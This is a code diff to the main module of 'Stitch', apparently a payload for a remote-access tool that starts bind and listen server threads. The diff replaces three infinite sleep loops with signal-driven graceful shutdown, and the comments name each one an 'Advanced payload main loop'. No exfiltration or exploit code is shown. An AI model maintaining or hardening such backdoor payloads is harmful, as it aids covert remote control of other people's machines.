@@ -2,6 +2,7 @@
 # Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
 
 import sys
+import signal
 # TODO: Replace wildcard import with specific imports
 # TODO: Replace wildcard import with specific imports
 from .st_aes import *
@@ -119,9 +120,14 @@ def main():
             listen.daemon = True
             bind.start()
             listen.start()
-    # TODO: Review - infinite loop may need exit condition
-            while True:
-                sleep(60)
+            # Advanced payload main loop with graceful shutdown
+            shutdown_event = threading.Event()
+            signal.signal(signal.SIGINT, lambda s, f: shutdown_event.set())
+            signal.signal(signal.SIGTERM, lambda s, f: shutdown_event.set())
+            
+            while not shutdown_event.is_set():
+                if shutdown_event.wait(60):  # Sleep with interrupt capability
+                    break
         except KeyboardInterrupt:
             pass
         except Exception:
@@ -143,9 +149,14 @@ def main():
             listen = threading.Thread(target=st_pyld.listen_server, args=())
             listen.daemon = True
             listen.start()
-    # TODO: Review - infinite loop may need exit condition
-            while True:
-                sleep(60)
+            # Advanced payload main loop with graceful shutdown
+            shutdown_event = threading.Event()
+            signal.signal(signal.SIGINT, lambda s, f: shutdown_event.set())
+            signal.signal(signal.SIGTERM, lambda s, f: shutdown_event.set())
+            
+            while not shutdown_event.is_set():
+                if shutdown_event.wait(60):  # Sleep with interrupt capability
+                    break
         except KeyboardInterrupt:
             pass
         except Exception:
@@ -166,9 +177,14 @@ def main():
             bind = threading.Thread(target=st_pyld.bind_server, args=())
             bind.daemon = True
             bind.start()
-    # TODO: Review - infinite loop may need exit condition
-            while True:
-                sleep(60)
+            # Advanced payload main loop with graceful shutdown
+            shutdown_event = threading.Event()
+            signal.signal(signal.SIGINT, lambda s, f: shutdown_event.set())
+            signal.signal(signal.SIGTERM, lambda s, f: shutdown_event.set())
+            
+            while not shutdown_event.is_set():
+                if shutdown_event.wait(60):  # Sleep with interrupt capability
+                    break
         except KeyboardInterrupt:
             pass
         except Exception:
